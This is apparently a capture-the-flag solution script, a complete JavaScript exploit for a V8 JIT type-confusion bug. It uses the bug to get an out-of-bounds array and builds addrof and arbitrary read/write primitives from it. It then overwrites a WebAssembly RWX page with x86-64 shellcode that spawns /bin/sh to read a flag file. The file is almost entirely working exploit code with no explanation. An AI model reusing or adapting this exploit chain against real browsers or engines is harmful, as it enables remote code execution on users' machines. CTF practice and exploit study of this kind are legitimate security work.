var data = new ArrayBuffer(8);
var flts = new Float64Array(data);
var ints = new BigUint64Array(data);

function ftoi(val) {
  flts[0] = val;
  return ints[0];
}

function itof(val) {
  ints[0] = val;
  return flts[0];
}

function foo() {
    var i = -Infinity;
    var j = 0;
    for (var k = 0; k < 1; k += i) {
        if (k == -Infinity) {
            i = +Infinity;
        }

        if (++j > 10) {
            break;
        }
    }

    var x = Math.abs(k);

    x = Math.max(x, 1024);
    x = -x;
    x = Math.max(x, -1025);
    x = -x;
    x -= 1022;
    x >>= 1;
    x += 10;

    var a = Array(x);
    a[0] = 1.1;

    var b = [{}, {}, {}];
    var c = [1.1, 2.2, 3.3];
    return [a, b, c];
}

for (var i = 0; i < 5000; ++i) {
    foo();
}

var x = foo();
var oob_arr = x[0];
var obj_arr = x[1];
var flt_arr = x[2];

function addrof(obj) {
    obj_arr[0] = obj;
    return (ftoi(oob_arr[22]) >> 32n) - 1n;
}

function arb_read(ptr) {
    var tmp = ftoi(oob_arr[31]) >> 32n;
    oob_arr[31] = itof((tmp << 32n) + (ptr - 8n + 1n));
    return ftoi(flt_arr[0]);
}

function arb_write(ptr, val) {
    var tmp = ftoi(oob_arr[31]) >> 32n;
    oob_arr[31] = itof((tmp << 32n) + (ptr - 8n + 1n));
    flt_arr[0] = itof(val);
}

function write(ptr, buf) {
    var b = new ArrayBuffer(buf.length);
    var v = new DataView(b);

    arb_write(addrof(b) + 0x14n, ptr);

    for (var i = 0; i < buf.length; ++i) {
        v.setUint8(i, buf[i]);
    }
}

var wasm_code = new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,
    0x60,0x00,0x01,0x7f,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,
    0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,
    0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,
    0x06,0x6d,0x65,0x6d,0x6f,0x72,0x79,0x02,0x00,0x04,0x6d,0x61,0x69,0x6e,0x00,
    0x00,0x0a,0x8a,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,
    0x2a,0x0b
]);

var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_entry = wasm_instance.exports.main;

var rwx_page = arb_read(addrof(wasm_instance) + 0x68n);

var shellcode = new Uint8Array([
0x48,0xb8,0x2f,0x62,0x69,0x6e,
0x2f,0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,0x66,0x68,0x2d,
0x63,0x54,0x5e,0x52,0xe8,0x0d,0x00,0x00,0x00,0x63,0x61,0x74,
0x20,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,0x00,0x56,0x57,
0x54,0x5e,0x6a,0x3b,0x58,0x0f,0x05
]);

write(rwx_page, shellcode);
wasm_entry();
// flag: HTB{wh0_kn3w_inc0rrect_typing_w4s_explo1table?!?}
